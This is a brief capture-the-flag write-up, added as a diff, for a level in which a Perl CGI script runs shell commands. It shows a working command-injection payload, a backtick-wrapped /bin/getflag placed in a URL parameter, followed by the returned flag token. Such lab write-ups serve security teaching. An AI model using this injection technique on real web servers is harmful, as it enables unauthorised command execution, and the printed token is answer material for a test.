@@ -1,0 +1,9 @@
+By reading the perl program level04.perl, we notice that it uses CGI which allows a web server to execute command line programs.
+
+The goal is then to execute /bin/getflag by going on the webserver page:
+
+IP/?x=`/bin/getflag`
+
+Which gives us:
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
